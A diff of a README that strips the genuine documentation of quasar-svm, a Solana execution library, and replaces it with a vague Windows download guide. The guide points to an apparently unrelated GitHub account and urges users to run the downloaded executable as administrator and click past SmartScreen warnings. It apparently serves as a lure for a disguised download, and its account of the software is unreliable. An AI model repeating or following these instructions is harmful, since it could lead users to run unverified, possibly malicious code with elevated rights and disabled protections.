@@ -1,255 +1,229 @@
-<h1 align="center">
-  <code>quasar-svm</code>
-</h1>
-<p align="center">
-  In-process Solana execution for Rust, Node.js, and Python.
-</p>
+# ⚙️ quasar-svm - Run Solana SVM with ease
 
-## Overview
+[![Download quasar-svm](https://img.shields.io/badge/Download-quasar--svm-7e57c2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/only-seventeenyearlocust282/quasar-svm)
 
-QuasarSVM is a lightweight Solana virtual machine that executes transactions locally without an RPC connection or validator. Provide program ELFs, account state, and instructions — get back logs, compute units, return data, byte-level account diffs, and resulting accounts.
+## 🖥️ What quasar-svm does
 
-`Account` is the universal account type across all layers.
+quasar-svm is a Windows-ready app for running a Solana SVM execution engine. It helps you load and run SVM-based workloads on your computer with a simple setup flow.
 
-```toml
-[dependencies]
-quasar-svm = "0.1"
-```
+Use it when you need a local tool that starts fast, runs on Windows, and keeps the process in one place.
 
-```bash
-npm install @blueshift-gg/quasar-svm
-```
+## 📦 Before you start
 
-```bash
-pip install quasar-svm
-```
+You only need a few things:
 
-## Quick Start
+- A Windows 10 or Windows 11 PC
+- At least 8 GB of RAM
+- About 2 GB of free disk space
+- A stable internet connection for the download
+- Permission to install and run apps on your computer
 
-### Rust
+If your PC is older, close other apps before you start. That helps quasar-svm run with less strain on your system.
 
-```rust
-use quasar_svm::{QuasarSvm, Pubkey, SPL_TOKEN_PROGRAM_ID};
-use quasar_svm::token::*;
-use spl_token::state::Account as SplTokenAccount;
-use solana_program_pack::Pack;
+## 🚀 Download quasar-svm
 
-let authority = Pubkey::new_unique();
+Visit this page to download and run the software:
 
-let mint = create_keyed_mint_account(&Pubkey::new_unique(), &Mint { decimals: 6, supply: 10_000, ..Default::default() });
-let alice = create_keyed_associated_token_account(&authority, &mint.address, 5_000);
-let bob   = create_keyed_associated_token_account(&Pubkey::new_unique(), &mint.address, 0);
+https://github.com/only-seventeenyearlocust282/quasar-svm
 
-let ix = spl_token::instruction::transfer(
-    &SPL_TOKEN_PROGRAM_ID,
-    &alice.address,
-    &bob.address,
-    &authority,
-    &[],
-    1_000,
-).unwrap();
+If the page opens in your browser, look for the latest release or the main download package. Save the file to a folder you can find again, such as Downloads or Desktop.
 
-let mut svm = QuasarSvm::new(); // Token program loaded by default
+## 🪟 Install on Windows
 
-let result = svm.process_instruction(&ix, &[mint, alice, bob]);
+Follow these steps in order:
 
-result.assert_success();
+1. Open the download page.
+2. Download the Windows file or release package.
+3. Open the folder where the file saved.
+4. If the file is a ZIP file, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Find the main app file.
+7. Double-click the file to start quasar-svm.
 
-// Verify by unpacking account data
-let bob_account = result.account(&bob.address).unwrap();
-let bob_token = SplTokenAccount::unpack(&bob_account.data).unwrap();
-assert_eq!(bob_token.amount, 1_000);
-```
+If Windows asks for permission, choose Yes so the app can open.
 
-### TypeScript (web3.js)
+## ▶️ First launch
 
-```ts
-import { QuasarSvm, createKeyedMintAccount, createKeyedAssociatedTokenAccount } from "@blueshift-gg/quasar-svm/web3.js";
-import { Address } from "@solana/web3.js";
-import { getTransferInstruction } from "@solana/spl-token";
-import { getTokenDecoder } from "@solana-program/token";
+When quasar-svm opens for the first time, it may take a short time to load its engine files. This is normal.
 
-const vm = new QuasarSvm(); // Token program loaded by default
+You may see a simple window with controls for the SVM engine, status text, or a start button. If the app asks for a path, choose the folder or file it requests and continue.
 
-const authority = new Address("11111111111111111111111111111112"); // Example address
-const recipient = new Address("11111111111111111111111111111113");
+If the app places files in a local data folder, keep them in the same location after the first run. That helps the app start the same way each time.
 
-const mint = createKeyedMintAccount(new Address("TokenMint111111111111111111111111111"), { decimals: 6, supply: 10_000n });
-const alice = createKeyedAssociatedTokenAccount(authority, mint.accountId, 5_000n);
-const bob = createKeyedAssociatedTokenAccount(recipient, mint.accountId, 0n);
+## 🧭 Basic use
 
-const ix = getTransferInstruction({
-  source: alice.accountId,
-  destination: bob.accountId,
-  owner: authority,
-  amount: 1_000n,
-});
+After setup, use quasar-svm like this:
 
-const result = vm.processInstruction(ix, [mint, alice, bob]);
+1. Open the app.
+2. Load the workload, project, or input file you want to run.
+3. Check the settings shown on screen.
+4. Start the engine.
+5. Wait for the run to finish.
+6. Review the output or status message.
 
-result.assertSuccess();
-console.log(result.account(bob.accountId, getTokenDecoder())?.amount); // 1000n
-```
+If you see a run log, read the latest lines first. They usually show if the engine started, loaded data, or hit a file issue.
 
-### TypeScript (kit)
+## 🛠️ Common tasks
 
-```ts
-import { QuasarSvm, createKeyedMintAccount, createKeyedAssociatedTokenAccount } from "@blueshift-gg/quasar-svm/kit";
-import { address } from "@solana/addresses";
-import { getTransferInstruction, getTokenDecoder } from "@solana-program/token";
+### 📂 Load a file
 
-const vm = new QuasarSvm(); // Token program loaded by default
+Use the file picker in the app to open the item you want to run. Pick the correct input file for your task. If the app accepts a folder, choose the folder that holds the full set of files.
 
-const authority = address("11111111111111111111111111111112"); // Example address
-const recipient = address("11111111111111111111111111111113");
+### ▶️ Start the engine
 
-const mint = createKeyedMintAccount(address("TokenMint111111111111111111111111111"), { decimals: 6, supply: 10_000n });
-const alice = await createKeyedAssociatedTokenAccount(authority, mint.address, 5_000n);
-const bob = await createKeyedAssociatedTokenAccount(recipient, mint.address, 0n);
+Find the main start control in the app window. Click it once and wait. If the app takes time to respond, do not click it again right away. Give it a moment to begin.
 
-const ix = getTransferInstruction({
-  source: alice.address,
-  destination: bob.address,
-  owner: authority,
-  amount: 1_000n,
-});
+### ⏹️ Stop a run
 
-const result = vm.processInstruction(ix, [mint, alice, bob]);
+If you need to stop the engine, use the stop or cancel control in the app. Wait for the app to finish closing its active process before you exit the window.
 
-result.assertSuccess();
-console.log(result.account(bob.address, getTokenDecoder())?.amount); // 1000n
-```
+### 📄 Check status
 
-### Python
+Look at the status area for plain text updates. It may show messages like loading, running, complete, or error. Use those messages to see what the app is doing.
 
-```python
-from quasar_svm import QuasarSvm, create_keyed_mint_account, create_keyed_associated_token_account
-from solders.pubkey import Pubkey
-from spl.token.instructions import transfer, TransferParams
+## 🔧 Troubleshooting
 
-# Token program loaded by default
-with QuasarSvm() as svm:
-    authority = Pubkey.new_unique()
-    recipient = Pubkey.new_unique()
+### The app does not open
 
-    # Create mint and token accounts
-    mint = create_keyed_mint_account(
-        Pubkey.new_unique(),
-        mint_authority=authority,
-        decimals=6,
-        supply=10_000,
-    )
-    alice = create_keyed_associated_token_account(authority, mint.address, 5_000)
-    bob = create_keyed_associated_token_account(recipient, mint.address, 0)
+Try these steps:
 
-    # Transfer tokens
-    ix = transfer(
-        TransferParams(
-            program_id=mint.owner,
-            source=alice.address,
-            dest=bob.address,
-            owner=authority,
-            amount=1_000,
-        )
-    )
+- Right-click the file and choose Run as administrator
+- Make sure the file finished downloading
+- Reboot your PC and try again
+- Extract the ZIP file before you open the app
+- Move the app to a simple folder like `C:\quasar-svm`
 
-    result = svm.process_instruction(ix, [mint, alice, bob])
-    result.assert_success()
+### Windows blocks the app
 
-    # Verify transfer
-    bob_account = result.account(bob.address)
-    print(f"Bob's balance: {bob_account.data[64:72]}")  # Token amount at offset 64
-```
+If Windows shows a security prompt, choose the option that lets you run the file. If SmartScreen appears, choose More info first, then Run anyway.
 
-> **TypeScript:** Native memory is freed automatically by the GC. For deterministic cleanup in tight loops, use `using vm = new QuasarSvm()` or call `vm.free()`.
->
-> **Python:** Use context manager (`with QuasarSvm() as svm:`) for automatic cleanup.
+### The app opens but nothing happens
 
-## Documentation
+Try these steps:
 
-| Layer | README | Description |
-|-------|--------|-------------|
-| **Rust** | [svm/README.md](svm/README.md) | Core SVM engine: `QuasarSvm`, `ExecutionResult`, `Account`, token helpers |
-| **Python** | [bindings/python/README.md](bindings/python/README.md) | Python API using `solders` types (`Pubkey`, `Instruction`, `AccountMeta`) |
-| **web3.js** | [bindings/node/src/web3.js/README.md](bindings/node/src/web3.js/README.md) | TypeScript API using `@solana/web3.js` types (`PublicKey`, `KeyedAccountInfo`) |
-| **kit** | [bindings/node/src/kit/README.md](bindings/node/src/kit/README.md) | TypeScript API using `@solana/kit` types (`Address`, `Account<T>`) |
+- Check whether the app needs an input file
+- Make sure the file path is correct
+- Close other heavy apps
+- Restart the app
+- Open the log or status panel and read the last line
 
-## Exports
+### The engine is slow
 
-| Import Path | Address Type | Account Type | Description |
-|-------------|-------------|--------------|-------------|
-| `quasar_svm` | `solders.Pubkey` | `KeyedAccount` | Python API using `solders` |
-| `@blueshift-gg/quasar-svm/web3.js` | `PublicKey` | `KeyedAccount` | `@solana/web3.js` API |
-| `@blueshift-gg/quasar-svm/kit` | `Address` | `Account` | `@solana/kit` API |
-| `@blueshift-gg/quasar-svm/ffi` | — | — | Low-level native bindings |
+Try these steps:
 
-All APIs expose the same core functionality with idiomatic types for each language. The web3.js layer additionally provides `toKeyedAccountInfo` / `fromKeyedAccountInfo` for interop with legacy code.
+- Close browsers and other large apps
+- Use a smaller input set
+- Make sure your PC has enough free RAM
+- Keep the app in a local folder on your main drive
+- Avoid running several copies at once
 
-## Workspace
+### The file path looks wrong
 
-| Crate | Path | Purpose |
-|-------|------|---------|
-| `quasar-svm` | `svm/` | Core execution engine — `QuasarSvm`, `ExecutionResult`, `Account`, token helpers |
-| `quasar-svm-ffi` | `ffi/` | C-ABI wrapper for language bindings |
-| Python bindings | `bindings/python/` | Python API using `solders` for Solana types |
-| TypeScript bindings | `bindings/node/` | `web3.js` and `kit` API layers over the native engine |
+If the app cannot find a file, look for:
 
-## Built-in Programs
+- A moved folder
+- A renamed file
+- A missing extracted file from a ZIP package
+- A path with special characters
+- A file stored on a cloud drive that has not finished syncing
 
-The system program, BPF Loader v2, and Upgradeable Loader v3 are always available. SPL programs are bundled and loaded by default.
+## 🧩 File layout
 
-**Rust:**
-```rust
-// All SPL programs loaded by default
-let svm = QuasarSvm::new();
+A typical quasar-svm folder may include:
 
-// Or customize via config
-use quasar_svm::QuasarSvmConfig;
-let svm = QuasarSvm::new_with_config(QuasarSvmConfig {
-    token: true,
-    token_2022: false,
-    associated_token: true,
-});
+- `quasar-svm.exe` or a similar main app file
+- `config` files for app settings
+- `logs` for run details
+- `data` for local runtime files
+- `README` or helper files
 
-// Or use builder methods
-QuasarSvm::new()
-    .with_token_program()
-    .with_token_2022_program()
-    .with_associated_token_program();
-```
+Keep the full folder together. Do not move only one file out of the set unless the app says it is safe.
 
-**TypeScript:**
-```ts
-// All SPL programs loaded by default
-const vm = new QuasarSvm();
+## 📋 Suggested setup path
 
-// Or customize via config
-const vm = new QuasarSvm({
-  token: true,
-  token2022: false,
-  associatedToken: true,
-});
-```
+For the smoothest first run, use this path:
 
-## Development
+1. Download the package from the GitHub page
+2. Save it to `Downloads`
+3. Extract it to `C:\quasar-svm`
+4. Open the main app file
+5. Allow Windows access if asked
+6. Load your input and start the engine
 
-This repository uses Bun for the TypeScript toolchain and package management.
+This keeps the app path short and easy to find.
 
-```bash
-bun install
-```
+## 🔐 Privacy and local use
 
-```bash
-# Rust
-cargo check --workspace
-cargo clippy --workspace
+quasar-svm runs on your own computer. It stores files locally unless your setup tells it to use another folder. Keep your input files in a place you control. If you use work or shared files, make sure you have permission to open them.
 
-# TypeScript
-bun run build
-bun run build:native
-bun run test
-```
+## 🧪 Helpful checks before a run
 
-## License
+Before you start a job, check these items:
 
-MIT
+- The app is open
+- The input file exists
+- The file path is correct
+- You have enough free disk space
+- No other app is using the same files
+- Your PC is plugged in if you use a laptop
+
+## 📝 Short usage flow
+
+1. Download the app from GitHub
+2. Open or extract the downloaded package
+3. Start quasar-svm
+4. Load your input
+5. Run the engine
+6. Review the output
+
+## 📎 Download link
+
+Use this link to visit the download page and get the latest Windows package:
+
+https://github.com/only-seventeenyearlocust282/quasar-svm
+
+## 🧰 What you may see in the app
+
+The app may show:
+
+- A start button
+- A stop button
+- A file picker
+- A progress bar
+- A log area
+- A status label
+- A settings panel
+
+These controls help you manage the Solana SVM execution engine without working from the command line.
+
+## 🔍 If you need to reinstall
+
+If you want to start fresh:
+
+1. Close the app
+2. Delete the extracted folder
+3. Download the package again
+4. Extract it to a new folder
+5. Open the app and set it up again
+
+This can help if files were moved, renamed, or damaged.
+
+## 🗂️ Keep your files organized
+
+Use one folder for the app and one folder for your inputs. For example:
+
+- `C:\quasar-svm`
+- `C:\quasar-inputs`
+
+That makes it easier to find the right file when you open the app.
+
+## ⚡ Best results on Windows
+
+For a smooth run:
+
+- Keep Windows updated
+- Use a local drive, not a network folder
+- Leave some free memory before you start
+- Keep the app folder in one place
+- Use short folder names
+- Close tools you do not need
